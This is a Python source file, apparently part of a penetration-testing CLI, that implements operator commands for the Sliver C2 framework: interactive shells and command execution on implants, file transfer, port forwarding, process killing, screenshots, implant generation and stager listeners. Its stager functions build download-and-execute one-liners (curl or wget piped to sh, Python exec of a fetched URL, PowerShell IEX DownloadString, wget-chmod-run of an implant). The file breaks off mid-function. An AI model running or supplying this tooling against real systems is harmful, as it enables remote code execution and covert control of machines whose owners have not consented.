"""Sliver C2 command handler for wish-cli."""

import asyncio
import logging
import time
import urllib.parse
from collections.abc import Callable, Coroutine
from datetime import datetime
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.panel import Panel
from rich.progress import BarColumn, DownloadColumn, Progress, SpinnerColumn, TextColumn
from rich.table import Table
from wish_c2 import (
    BaseC2Connector,
    FileTransferProgress,
    ImplantConfig,
    InteractiveShell,
    SessionNotFoundError,
)

logger = logging.getLogger(__name__)


class SliverCommand:
    """Sliver C2 command handler."""

    def __init__(self, c2_connector: BaseC2Connector, ui_manager: Any = None) -> None:
        """Initialize Sliver command handler.

        Args:
            c2_connector: C2 connector instance
            ui_manager: Optional UI manager for headless mode
        """
        self.c2 = c2_connector
        self.ui_manager = ui_manager
        self.console = Console()

    def _print(self, *args: Any, **kwargs: Any) -> None:
        """Print output using UI manager if available, otherwise console."""
        if self.ui_manager and hasattr(self.ui_manager, "print"):
            self.ui_manager.print(*args, **kwargs)
        else:
            self.console.print(*args, **kwargs)

    async def execute(self, args: list[str]) -> Any:
        """Execute Sliver command.

        Args:
            args: Command arguments

        Returns:
            InteractiveShell if shell command, None otherwise
        """
        if not args:
            await self.show_help()
            return None

        subcommand = args[0].lower()
        handlers: dict[str, Callable[[list[str]], Coroutine[Any, Any, Any]]] = {
            "status": self.handle_status,
            "implants": self.handle_implants,
            "sessions": self.handle_implants,  # alias
            "shell": self.handle_shell,
            "execute": self.handle_execute,
            "upload": self.handle_upload,
            "download": self.handle_download,
            "ls": self.handle_ls,
            "portfwd": self.handle_portfwd,
            "ps": self.handle_ps,
            "kill": self.handle_kill,
            "screenshot": self.handle_screenshot,
            "generate": self.handle_generate,
            "stager": self.handle_stager,
            "http": self.handle_http,
            "help": self.show_help,
        }

        handler = handlers.get(subcommand)
        if handler:
            # Special handling for shell command
            if subcommand == "shell":
                return await handler(args[1:])
            else:
                await handler(args[1:])
                return None
        else:
            await self.handle_unknown(args[1:])
            return None

    async def show_help(self, args: list[str] | None = None) -> None:
        """Show Sliver command help."""
        help_text = """
[bold]Sliver C2 Commands[/bold]

[bold blue]Basic Commands:[/bold blue]
  status              Show C2 connection status
  implants/sessions   List active implants
  shell <id/name>     Start interactive shell
  execute <id> <cmd>  Execute single command

[bold blue]File Operations:[/bold blue]
  upload <id> <local> <remote>    Upload file to target
  download <id> <remote> <local>  Download file from target
  ls <id> <path>                  List directory contents

[bold blue]Port Forwarding:[/bold blue]
  portfwd add <id> <lport> <rhost:rport>  Create port forward
  portfwd list [id]                       List port forwards
  portfwd remove <pfid>                   Remove port forward

[bold blue]Process Management:[/bold blue]
  ps <id>                     List processes
  kill <id> <pid> [-f]        Kill process (-f for force)
  screenshot <id>             Take screenshot

[bold blue]Implant Management:[/bold blue]
  generate [options]          Generate new implant

[bold blue]Stager Commands:[/bold blue]
  stager start --host <IP>    Start stager listener & show default stager
  stager stop <id>            Stop stager listener
  stager list                 List active stager listeners
  stager create <id> --type   Create additional stager types

[bold blue]HTTP Listener Commands:[/bold blue]
  http start --host <IP>      Start HTTP listener for callbacks
  http stop <id>              Stop HTTP listener
  http list                   List active HTTP listeners

[bold blue]Examples:[/bold blue]
  /sliver shell FANCY_TIGER
  /sliver upload FANCY_TIGER /tmp/tool.sh /tmp/tool.sh
  /sliver download FANCY_TIGER /etc/passwd ./passwd.txt
  /sliver portfwd add FANCY_TIGER 8080 127.0.0.1:80
  /sliver ps FANCY_TIGER
  /sliver generate --host 10.10.14.2 --os linux
  /sliver stager start --host 10.10.14.2
        """
        self._print(Panel(help_text, title="Sliver C2 Help", border_style="blue"))

    async def handle_unknown(self, args: list[str]) -> None:
        """Handle unknown subcommand."""
        self._print("[red]Unknown subcommand. Use '/sliver help' for available commands.[/red]")

    async def handle_status(self, args: list[str]) -> None:
        """Show C2 connection status."""
        if await self.c2.is_connected():
            server = await self.c2.get_server()
            sessions = await self.c2.get_sessions()

            status = Panel(
                f"[green]● Connected[/green] to Sliver C2 server\nServer: {server}\nSessions: {len(sessions)} active",
                title="Sliver C2 Status",
                border_style="green",
            )
        else:
            status = Panel(
                "[red]● Disconnected[/red] from Sliver C2 server",
                title="Sliver C2 Status",
                border_style="red",
            )

        self._print(status)

    async def handle_implants(self, args: list[str]) -> None:
        """List active implants/sessions."""
        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        sessions = await self.c2.get_sessions()

        if not sessions:
            self._print("[yellow]No active sessions[/yellow]")
            return

        # Create compact table with key information
        table = Table(title="Active Sessions", show_header=True)
        table.add_column("#", style="dim", width=3)
        table.add_column("Host", style="yellow")
        table.add_column("User", style="magenta")
        table.add_column("OS/Arch", style="cyan")
        table.add_column("Status")
        table.add_column("Last Check-in", style="dim")
        table.add_column("ID", style="dim")
        table.add_column("Name", style="green", overflow="ellipsis", max_width=30)

        for i, session in enumerate(sessions, 1):
            status_color = "green" if session.status == "active" else "yellow"
            table.add_row(
                str(i),
                session.host,
                session.user,
                f"{session.os}/{session.arch}",
                f"[{status_color}]{session.status}[/{status_color}]",
                session.last_checkin.strftime("%H:%M:%S"),
                session.id[:8],
                session.name,
            )

        self._print(table)
        self._print("\n[dim]Use '/sliver shell <#|ID>' to interact with a session[/dim]")

    async def handle_shell(self, args: list[str]) -> InteractiveShell | None:
        """Start interactive shell session.

        Returns:
            InteractiveShell instance if successful, None otherwise
        """
        if not args:
            self._print("[red]Usage: /sliver shell <session_id|name>[/red]")
            return None

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return None

        session_ref = args[0]

        # Handle session number reference (e.g., "1", "2", etc.)
        if session_ref.isdigit():
            session_num = int(session_ref)
            sessions = await self.c2.get_sessions()
            if 1 <= session_num <= len(sessions):
                # Convert session number to session ID
                session_ref = sessions[session_num - 1].id
            else:
                self._print(f"[red]Invalid session number: {session_num}[/red]")
                self._print(f"[dim]Valid range: 1-{len(sessions)}[/dim]")
                return None

        try:
            # Start interactive shell
            self._print(f"[green]Starting shell on {session_ref}...[/green]")
            await asyncio.sleep(0.5)  # Brief delay for realism

            shell = await self.c2.start_interactive_shell(session_ref)

            # Get session info for prompt
            session = shell.session
            self._print(f"[green]Connected to {session.name} ({session.host})[/green]")
            self._print("[dim]Type 'exit' to return to wish[/dim]\n")

            # Return the shell instance for the CLI to handle
            return shell

        except SessionNotFoundError:
            self._print(f"[red]Session '{session_ref}' not found[/red]")
            return None
        except Exception as e:
            logger.error(f"Failed to start shell: {e}")
            self._print(f"[red]Failed to start shell: {e}[/red]")
            return None

    async def handle_execute(self, args: list[str]) -> None:
        """Execute single command on implant."""
        if len(args) < 2:
            self._print("[red]Usage: /sliver execute <session_id|name> <command>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        session_ref = args[0]
        command = " ".join(args[1:])

        try:
            self._print(f"[dim]Executing '{command}' on {session_ref}...[/dim]")
            result = await self.c2.execute_command(session_ref, command)

            if result.stdout:
                self._print(result.stdout)
            if result.stderr:
                self._print(f"[red]{result.stderr}[/red]")

            if result.exit_code != 0:
                self._print(f"[yellow]Exit code: {result.exit_code}[/yellow]")

        except SessionNotFoundError:
            self._print(f"[red]Session '{session_ref}' not found[/red]")
        except Exception as e:
            logger.error(f"Failed to execute command: {e}")
            self._print(f"[red]Failed to execute command: {e}[/red]")

    async def handle_upload(self, args: list[str]) -> None:
        """Handle file upload."""
        if len(args) < 3:
            self._print("[red]Usage: /sliver upload <session_id> <local_file> <remote_path>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        session_id = args[0]
        local_path = Path(args[1])
        remote_path = args[2]

        if not local_path.exists():
            self._print(f"[red]Local file not found: {local_path}[/red]")
            return

        try:
            # Create progress bar
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                DownloadColumn(),
                console=self.console,
            ) as progress:
                task = progress.add_task(f"Uploading {local_path.name}...", total=local_path.stat().st_size)

                def progress_callback(transfer: FileTransferProgress) -> None:
                    progress.update(
                        task,
                        completed=transfer.transferred_bytes,
                        description=f"Uploading {transfer.filename} ({transfer.progress_percentage:.1f}%)",
                    )

                success = await self.c2.upload_file(session_id, local_path, remote_path, progress_callback)

            if success:
                self._print(f"[green]✓ Uploaded {local_path} to {remote_path}[/green]")
            else:
                self._print("[red]Upload failed[/red]")

        except SessionNotFoundError:
            self._print(f"[red]Session '{session_id}' not found[/red]")
        except Exception as e:
            logger.error(f"Upload failed: {e}")
            self._print(f"[red]Upload failed: {e}[/red]")

    async def handle_download(self, args: list[str]) -> None:
        """Handle file download."""
        if len(args) < 3:
            self._print("[red]Usage: /sliver download <session_id> <remote_file> <local_path>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        session_id = args[0]
        remote_path = args[1]
        local_path = Path(args[2])

        try:
            # Create progress bar
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                DownloadColumn(),
                console=self.console,
            ) as progress:
                task = progress.add_task(f"Downloading {Path(remote_path).name}...", total=None)

                def progress_callback(transfer: FileTransferProgress) -> None:
                    if progress.tasks[task].total is None:
                        progress.update(task, total=transfer.total_bytes)
                    progress.update(
                        task,
                        completed=transfer.transferred_bytes,
                        description=f"Downloading {transfer.filename} ({transfer.progress_percentage:.1f}%)",
                    )

                success = await self.c2.download_file(session_id, remote_path, local_path, progress_callback)

            if success:
                self._print(f"[green]✓ Downloaded {remote_path} to {local_path}[/green]")
            else:
                self._print("[red]Download failed[/red]")

        except SessionNotFoundError:
            self._print(f"[red]Session '{session_id}' not found[/red]")
        except Exception as e:
            logger.error(f"Download failed: {e}")
            self._print(f"[red]Download failed: {e}[/red]")

    async def handle_ls(self, args: list[str]) -> None:
        """Handle directory listing."""
        if len(args) < 2:
            self._print("[red]Usage: /sliver ls <session_id> <path>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        session_id = args[0]
        path = args[1] if len(args) > 1 else "."

        try:
            entries = await self.c2.list_directory(session_id, path)

            if not entries:
                self._print(f"[yellow]No entries in {path}[/yellow]")
                return

            # Create table
            table = Table(title=f"Directory: {path}")
            table.add_column("Mode", style="cyan")
            table.add_column("Size", style="green")
            table.add_column("Modified", style="yellow")
            table.add_column("Name", style="white")

            for entry in entries:
                name = f"[blue]{entry.name}/[/blue]" if entry.is_dir else entry.name
                size = "-" if entry.is_dir else f"{entry.size:,}"
                table.add_row(
                    entry.mode,
                    size,
                    entry.modified_at.strftime("%Y-%m-%d %H:%M"),
                    name,
                )

            self._print(table)

        except SessionNotFoundError:
            self._print(f"[red]Session '{session_id}' not found[/red]")
        except Exception as e:
            logger.error(f"Directory listing failed: {e}")
            self._print(f"[red]Failed to list directory: {e}[/red]")

    async def handle_portfwd(self, args: list[str]) -> None:
        """Handle port forwarding commands."""
        if not args:
            self._print("[red]Usage: /sliver portfwd <add|list|remove> ...[/red]")
            return

        subcommand = args[0].lower()

        if subcommand == "add":
            await self._handle_portfwd_add(args[1:])
        elif subcommand == "list":
            await self._handle_portfwd_list(args[1:])
        elif subcommand == "remove":
            await self._handle_portfwd_remove(args[1:])
        else:
            self._print(f"[red]Unknown portfwd command: {subcommand}[/red]")

    async def _handle_portfwd_add(self, args: list[str]) -> None:
        """Add port forward."""
        if len(args) < 3:
            self._print("[red]Usage: /sliver portfwd add <session_id> <local_port> <remote_host:port>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        session_id = args[0]
        try:
            local_port = int(args[1])
        except ValueError:
            self._print(f"[red]Invalid local port: {args[1]}[/red]")
            return

        # Parse remote host:port
        remote_spec = args[2]
        if ":" not in remote_spec:
            self._print("[red]Remote must be in format host:port[/red]")
            return

        remote_host, remote_port_str = remote_spec.rsplit(":", 1)
        try:
            remote_port = int(remote_port_str)
        except ValueError:
            self._print(f"[red]Invalid remote port: {remote_port_str}[/red]")
            return

        try:
            pf = await self.c2.create_port_forward(session_id, local_port, remote_host, remote_port)
            self._print(
                f"[green]✓ Created port forward: "
                f"127.0.0.1:{local_port} -> {remote_host}:{remote_port} "
                f"(ID: {pf.id[:8]})[/green]"
            )

        except SessionNotFoundError:
            self._print(f"[red]Session '{session_id}' not found[/red]")
        except Exception as e:
            logger.error(f"Port forward creation failed: {e}")
            self._print(f"[red]Failed to create port forward: {e}[/red]")

    async def _handle_portfwd_list(self, args: list[str]) -> None:
        """List port forwards."""
        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        session_id = args[0] if args else None

        try:
            forwards = await self.c2.list_port_forwards(session_id)

            if not forwards:
                self._print("[yellow]No active port forwards[/yellow]")
                return

            table = Table(title="Active Port Forwards")
            table.add_column("ID", style="cyan", width=10)
            table.add_column("Session", style="green")
            table.add_column("Local", style="yellow")
            table.add_column("Remote", style="magenta")
            table.add_column("Status", style="white")
            table.add_column("Traffic", style="blue")

            for pf in forwards:
                status_color = "green" if pf.status == "active" else "red"
                traffic = f"↑{pf.bytes_sent:,} ↓{pf.bytes_received:,}"
                table.add_row(
                    pf.id[:8],
                    pf.session_id[:8],
                    f"{pf.local_host}:{pf.local_port}",
                    f"{pf.remote_host}:{pf.remote_port}",
                    f"[{status_color}]{pf.status}[/{status_color}]",
                    traffic,
                )

            self._print(table)

        except Exception as e:
            logger.error(f"Failed to list port forwards: {e}")
            self._print(f"[red]Failed to list port forwards: {e}[/red]")

    async def _handle_portfwd_remove(self, args: list[str]) -> None:
        """Remove port forward."""
        if not args:
            self._print("[red]Usage: /sliver portfwd remove <forward_id>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        forward_id = args[0]

        try:
            success = await self.c2.remove_port_forward(forward_id)
            if success:
                self._print(f"[green]✓ Removed port forward {forward_id}[/green]")
            else:
                self._print(f"[yellow]Port forward {forward_id} not found[/yellow]")

        except Exception as e:
            logger.error(f"Failed to remove port forward: {e}")
            self._print(f"[red]Failed to remove port forward: {e}[/red]")

    async def handle_ps(self, args: list[str]) -> None:
        """Handle process listing."""
        if not args:
            self._print("[red]Usage: /sliver ps <session_id>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        session_id = args[0]

        try:
            self._print("[dim]Getting process list...[/dim]")
            processes = await self.c2.get_processes(session_id)

            if not processes:
                self._print("[yellow]No processes found[/yellow]")
                return

            # Sort by PID
            processes.sort(key=lambda p: p.pid)

            table = Table(title=f"Processes on {session_id}")
            table.add_column("PID", style="cyan", justify="right")
            table.add_column("Name", style="green")
            table.add_column("Owner", style="yellow")
            table.add_column("CPU%", style="magenta", justify="right")
            table.add_column("MEM%", style="blue", justify="right")
            table.add_column("Status", style="white")

            for proc in processes[:50]:  # Limit to first 50
                # Highlight system processes
                name_style = "red" if proc.is_system_process else "green"
                table.add_row(
                    str(proc.pid),
                    f"[{name_style}]{proc.name}[/{name_style}]",
                    proc.owner,
                    f"{proc.cpu_percent:.1f}",
                    f"{proc.memory_percent:.1f}",
                    proc.status,
                )

            self._print(table)
            if len(processes) > 50:
                self._print(f"[dim]Showing first 50 of {len(processes)} processes[/dim]")

        except SessionNotFoundError:
            self._print(f"[red]Session '{session_id}' not found[/red]")
        except Exception as e:
            logger.error(f"Process listing failed: {e}")
            self._print(f"[red]Failed to list processes: {e}[/red]")

    async def handle_kill(self, args: list[str]) -> None:
        """Handle process termination."""
        if len(args) < 2:
            self._print("[red]Usage: /sliver kill <session_id> <pid> [-f][/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        session_id = args[0]
        try:
            pid = int(args[1])
        except ValueError:
            self._print(f"[red]Invalid PID: {args[1]}[/red]")
            return

        force = "-f" in args or "--force" in args

        try:
            self._print(f"[dim]Killing process {pid}...[/dim]")
            success = await self.c2.kill_process(session_id, pid, force)

            if success:
                self._print(f"[green]✓ Killed process {pid}[/green]")
            else:
                self._print(f"[yellow]Process {pid} not found or already dead[/yellow]")

        except SessionNotFoundError:
            self._print(f"[red]Session '{session_id}' not found[/red]")
        except Exception as e:
            logger.error(f"Process kill failed: {e}")
            self._print(f"[red]Failed to kill process: {e}[/red]")

    async def handle_screenshot(self, args: list[str]) -> None:
        """Handle screenshot capture."""
        if not args:
            self._print("[red]Usage: /sliver screenshot <session_id> [output_file][/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        session_id = args[0]
        output_file = Path(args[1]) if len(args) > 1 else Path(f"screenshot_{session_id}.png")

        try:
            self._print("[dim]Capturing screenshot...[/dim]")
            screenshot = await self.c2.take_screenshot(session_id)

            # Save to file
            output_file.write_bytes(screenshot.data)

            self._print(
                f"[green]✓ Screenshot saved to {output_file} "
                f"({screenshot.size_bytes:,} bytes, "
                f"{screenshot.resolution[0]}x{screenshot.resolution[1]})[/green]"
            )

        except SessionNotFoundError:
            self._print(f"[red]Session '{session_id}' not found[/red]")
        except NotImplementedError:
            self._print("[yellow]Screenshot feature not implemented[/yellow]")
        except Exception as e:
            logger.error(f"Screenshot failed: {e}")
            self._print(f"[red]Failed to capture screenshot: {e}[/red]")

    async def handle_generate(self, args: list[str]) -> None:
        """Handle implant generation."""
        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        # Parse arguments
        config = ImplantConfig(
            callback_host="",  # Required field
            os="linux",
            arch="amd64",
            format="exe",
            protocol="https",
            callback_port=443,
        )

        # Simple argument parsing
        i = 0
        while i < len(args):
            arg = args[i]
            if arg in ["--host", "-h"] and i + 1 < len(args):
                config.callback_host = args[i + 1]
                i += 2
            elif arg in ["--port", "-p"] and i + 1 < len(args):
                try:
                    config.callback_port = int(args[i + 1])
                except ValueError:
                    self._print(f"[red]Invalid port: {args[i + 1]}[/red]")
                    return
                i += 2
            elif arg in ["--os", "-o"] and i + 1 < len(args):
                config.os = args[i + 1].lower()
                i += 2
            elif arg in ["--arch", "-a"] and i + 1 < len(args):
                config.arch = args[i + 1].lower()
                i += 2
            elif arg in ["--format", "-f"] and i + 1 < len(args):
                config.format = args[i + 1].lower()
                i += 2
            elif arg in ["--protocol"] and i + 1 < len(args):
                config.protocol = args[i + 1].lower()
                i += 2
            elif arg in ["--name", "-n"] and i + 1 < len(args):
                config.name = args[i + 1]
                i += 2
            else:
                self._print(f"[red]Unknown argument: {arg}[/red]")
                self._print("[dim]Usage: /sliver generate --host <callback_host> [options][/dim]")
                self._print("[dim]Options: --port, --os, --arch, --format, --protocol, --name[/dim]")
                return

        # Validate required fields
        if not config.callback_host:
            self._print("[red]Error: --host is required[/red]")
            self._print("[dim]Usage: /sliver generate --host <callback_host> [options][/dim]")
            return

        try:
            # Generate implant
            self._print(f"[dim]Generating {config.os}/{config.arch} implant...[/dim]")
            implant_info = await self.c2.generate_implant(config)

            # Display success
            self._print(
                Panel(
                    f"[green]✓ Generated implant: {implant_info.name}[/green]\n\n"
                    f"File: {implant_info.file_path}\n"
                    f"Size: {implant_info.size:,} bytes\n"
                    f"SHA256: {implant_info.hash_sha256[:32]}...\n"
                    f"OS/Arch: {config.os}/{config.arch}\n"
                    f"Callback: {config.protocol}://{config.callback_host}:{config.callback_port}",
                    title="Implant Generated",
                    border_style="green",
                )
            )

            # Suggest next steps
            self._print("\n[dim]Next steps:[/dim]")
            self._print("[dim]1. Start stager listener: /sliver stager start --host <IP>[/dim]")
            self._print("[dim]2. Use the generated implant in your exploitation[/dim]")

        except NotImplementedError:
            self._print("[yellow]Implant generation not implemented[/yellow]")
        except Exception as e:
            logger.error(f"Implant generation failed: {e}")

            # Check for common errors and provide helpful messages
            error_str = str(e)
            if "UNIQUE constraint failed: implant_builds.name" in error_str:
                self._print(f"[red]Error: Implant name '{config.name}' already exists[/red]")
                self._print("[yellow]Tip: Use a different name or add a timestamp/random suffix[/yellow]")
                self._print(
                    f"[dim]Example: /sliver generate --host {config.callback_host} --name "
                    f"{config.name}_{int(time.time())} --os {config.os} --arch {config.arch}[/dim]"
                )
            else:
                self._print(f"[red]Failed to generate implant: {e}[/red]")

    def _print_stager_commands(self, listener_url: str, stager_name: str) -> None:
        """Print helpful stager execution commands."""
        panel_content = [
            "[bold cyan]Stager Execution Commands:[/bold cyan]",
            "",
            "[yellow]# Method 1: Python (HTB Lame compatible)[/yellow]",
            f"python -c \"import urllib2;exec(urllib2.urlopen('{listener_url}/{stager_name}').read())\"",
            "",
            "[yellow]# Method 2: curl[/yellow]",
            f"curl -sSL {listener_url}/{stager_name} | sh",
            "",
            "[yellow]# Method 3: wget[/yellow]",
            f"wget -qO- {listener_url}/{stager_name} | sh",
            "",
            "[yellow]# Method 4: PowerShell (Windows)[/yellow]",
            f"IEX(New-Object Net.WebClient).DownloadString('{listener_url}/{stager_name}')",
            "",
            "[yellow]# Method 5: Bash one-liner[/yellow]",
            f'bash -c "$(curl -fsSL {listener_url}/{stager_name})"',
        ]

        self._print("\n[bold]Stager Commands:[/bold]")
        for line in panel_content:
            self._print(line)

    async def handle_stager(self, args: list[str]) -> None:
        """Handle stager commands with new command structure."""
        if not args:
            await self._show_stager_help()
            return

        subcommand = args[0].lower()

        if subcommand == "start":
            await self._handle_stager_start(args[1:])
        elif subcommand == "stop":
            await self._handle_stager_stop(args[1:])
        elif subcommand == "list":
            await self._handle_stager_list(args[1:])
        elif subcommand == "status":
            await self._handle_stager_status(args[1:])
        elif subcommand == "create":
            await self._handle_stager_create(args[1:])
        elif subcommand == "help":
            await self._show_stager_help()
        else:
            self._print(f"[red]Unknown stager command: {subcommand}[/red]")
            await self._show_stager_help()

    async def _show_stager_help(self) -> None:
        """Show stager command help."""
        help_text = """[bold]Stager Commands[/bold]

[bold blue]Commands:[/bold blue]
  start [--host <IP>] [--port <port>]  Start stager listener & show default stager
  stop <listener-id>                    Stop stager listener
  list                                  List active stager listeners
  status                                Show active download status
  create <listener-id> --type <type>    Create additional stager types

[bold blue]Stager Types:[/bold blue]
  python      Python one-liner (legacy, same as python2)
  python2     Python 2 one-liner (HTB Lame, old Linux)
  python3     Python 3 one-liner (modern environments)
  bash        Bash/sh one-liner
  powershell  PowerShell one-liner (Windows)
  vbs         VBScript (legacy Windows)
  minimal     Minimal Python 2 (no OS detection)
  debug       Debug version (verbose output)

[bold blue]Example:[/bold blue]
  /sliver stager start --host 10.10.14.2
  /sliver stager create stg-abc123 --type powershell
        """
        self._print(Panel(help_text, title="Stager Help", border_style="blue"))

    async def _handle_stager_start(self, args: list[str]) -> None:
        """Handle stager start command."""
        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        # Parse arguments
        host = None
        port = None  # Default to random port

        i = 0
        while i < len(args):
            arg = args[i]
            if arg in ["--host", "-h"] and i + 1 < len(args):
                host = args[i + 1]
                i += 2
            elif arg in ["--port", "-p"] and i + 1 < len(args):
                try:
                    port = int(args[i + 1])
                except ValueError:
                    self._print(f"[red]Invalid port: {args[i + 1]}[/red]")
                    return
                i += 2
            else:
                i += 1

        if not host:
            self._print("[red]Usage: /sliver stager start --host <IP> [--port <port>][/red]")
            return

        try:
            # Check if HTTP listener is running
            self._print(f"[dim]Checking for HTTP listener on {host}...[/dim]")
            http_listeners = await self.c2.list_http_listeners()
            http_running = any(
                listener.get("host") == host and listener.get("port") == 80 for listener in http_listeners
            )

            if not http_running:
                self._print("[yellow]⚠️  No HTTP listener found for implant callbacks[/yellow]")
                self._print(f"[yellow]Starting HTTP listener on {host}:80...[/yellow]")
                try:
                    await self.c2.start_http_listener(host, 80)
                    self._print(f"[green]✓ HTTP listener started on {host}:80[/green]")
                except Exception as e:
                    self._print(f"[red]Failed to start HTTP listener: {e}[/red]")
                    self._print("[yellow]Note: Implants may not be able to connect back[/yellow]")
            else:
                self._print(f"[green]✓ HTTP listener already running on {host}:80[/green]")

            # Start stager listener
            if port:
                self._print(f"[dim]Starting stager listener on http://{host}:{port}...[/dim]")
            else:
                self._print(f"[dim]Starting stager listener on http://{host} (random port)...[/dim]")

            # Define progress callback to display messages in CLI
            def progress_callback(message: str):
                # Convert plain messages to rich formatted messages
                if message.startswith("[*]"):
                    self._print(f"[dim]{message}[/dim]")
                elif message.startswith("[+]"):
                    self._print(f"[green]{message}[/green]")
                elif message.startswith("[") and "/" in message and "]" in message:
                    # Progress indicators like [1/4]
                    self._print(f"[cyan]{message}[/cyan]")
                else:
                    self._print(message)

            # For now, use the existing method - will be replaced with proper implementation
            listener, _ = await self.c2.start_stager_listener("default", host, port, "http", progress_callback)

            # Display listener info in Panel
            self._print(
                Panel(
                    f"[green]✓ Stager listener started[/green]\n\n"
                    f"Listener ID: {listener.id}\n"
                    f"URL: {listener.url}\n"
                    f"Status: {listener.status}",
                    title="Stager Listener",
                    border_style="green",
                )
            )

            # Generate and display default Python stager
            self._print_default_stager(listener.url, listener.id)

        except NotImplementedError:
            self._print("[yellow]Stager feature not implemented[/yellow]")
        except Exception as e:
            logger.error(f"Stager start failed: {e}")
            self._print(f"[red]Failed to start stager: {e}[/red]")

    def _print_default_stager(self, listener_url: str, listener_id: str = None) -> None:
        """Print default Python stager with environment detection."""
        # Parse URL to ensure clean formatting
        parsed = urllib.parse.urlparse(listener_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Python 2 stager (for old environments like HTB Lame)
        python2_stager = (
            f'python -c "'
            f"import urllib2,platform;"
            f"o=platform.system().lower();"
            f"a='64' if '64' in platform.machine() else '32';"
            f"exec(urllib2.urlopen('{base_url}/s?o='+o+'&a='+a).read())\""
        )

        # Python 3 stager (for modern environments)
        python3_stager = (
            f'python3 -c "'
            f"import urllib.request,platform;"
            f"o=platform.system().lower();"
            f"a='64' if '64' in platform.machine() else '32';"
            f"exec(urllib.request.urlopen('{base_url}/s?o='+o+'&a='+a).read())\""
        )

        # Alternative stager options for poor environments
        wget_stager = (
            f"wget -q -O- '{base_url}/s?o='$(uname -s | tr '[:upper:]' '[:lower:]')"
            f"'&a='$(uname -m | grep -q 64 && echo 64 || echo 32) | python"
        )

        curl_stager = (
            f"curl -s '{base_url}/s?o='$(uname -s | tr '[:upper:]' '[:lower:]')"
            f"'&a='$(uname -m | grep -q 64 && echo 64 || echo 32) | python"
        )

        # Minimal Python 2 stager for very poor environments
        minimal_python2_stager = (
            f"python -c \"import urllib2;exec(urllib2.urlopen('{base_url}/s?o=linux&a=32').read())\""
        )

        panel_content = [
            "[bold cyan]Default Stagers:[/bold cyan]",
            "",
            "[bold yellow]Python 2 (HTB Lame, old Linux environments):[/bold yellow]",
            python2_stager,
            "",
            "[bold yellow]Python 3 (modern environments):[/bold yellow]",
            python3_stager,
            "",
            "[bold cyan]Alternative Methods (for poor shells):[/bold cyan]",
            "",
            "[yellow]1. Wget method:[/yellow]",
            wget_stager,
            "",
            "[yellow]2. Curl method:[/yellow]",
            curl_stager,
            "",
            "[yellow]3. Minimal Python 2 (no detection, Linux 32-bit assumed):[/yellow]",
            minimal_python2_stager,
            "",
            "[yellow]4. Manual download and execute:[/yellow]",
            f"wget {base_url}/implant/stager_linux_386 -O /tmp/s && chmod +x /tmp/s && /tmp/s",
            "",
            "[dim]For more stager types, use:[/dim]",
            f"[dim]/sliver stager create {listener_id or 'LISTENER_ID'} --type [python2|python3|bash|"
            "powershell|vbs|minimal|debug][/dim]",
        ]

        self._print("\n[bold]Stager Commands:[/bold]")
        for line in panel_content:
            self._print(line)

    async def _handle_stager_stop(self, args: list[str]) -> None:
        """Handle stager stop command."""
        if not args:
            self._print("[red]Usage: /sliver stager stop <listener-id>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        listener_id = args[0]
        try:
            success = await self.c2.stop_stager_listener(listener_id)
            if success:
                self._print(f"[green]✓ Stopped stager listener: {listener_id}[/green]")
            else:
                self._print(f"[red]Failed to stop stager listener: {listener_id}[/red]")
        except NotImplementedError:
            self._print("[yellow]Stager stop not implemented[/yellow]")
        except Exception as e:
            logger.error(f"Stager stop failed: {e}")
            self._print(f"[red]Failed to stop stager: {e}[/red]")

    async def _handle_stager_list(self, args: list[str]) -> None:
        """Handle stager list command."""
        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        try:
            listeners = await self.c2.list_stager_listeners()

            if not listeners:
                self._print("[yellow]No active stager listeners[/yellow]")
                return

            table = Table(title="Active Stager Listeners", show_header=True)
            table.add_column("ID", style="cyan")
            table.add_column("URL", style="green")
            table.add_column("Status", style="yellow")
            table.add_column("Started", style="dim")

            for listener in listeners:
                table.add_row(
                    listener.id,
                    listener.url,
                    listener.status,
                    listener.started_at.strftime("%Y-%m-%d %H:%M:%S"),
                )

            self._print(table)

        except NotImplementedError:
            self._print("[yellow]Stager list not implemented[/yellow]")
        except Exception as e:
            logger.error(f"Failed to list stagers: {e}")
            self._print(f"[red]Failed to list stagers: {e}[/red]")

    async def _handle_stager_create(self, args: list[str]) -> None:
        """Handle stager create command."""
        if len(args) < 3:
            self._print("[red]Usage: /sliver stager create <listener-id> --type <type>[/red]")
            return

        if not await self.c2.is_connected():
            self._print("[red]Not connected to Sliver C2 server[/red]")
            return

        listener_id = args[0]
        stager_type = None

        # Parse arguments
        i = 1
        while i < len(args):
            if args[i] in ["--type", "-t"] and i + 1 < len(args):
                stager_type = args[i + 1].lower()
                i += 2
            else:
                i += 1

        if not stager_type:
            self._print("[red]Missing required --type argument[/red]")
            return

        if stager_type not in ["python", "python2", "python3", "bash", "powershell", "vbs", "minimal", "debug"]:
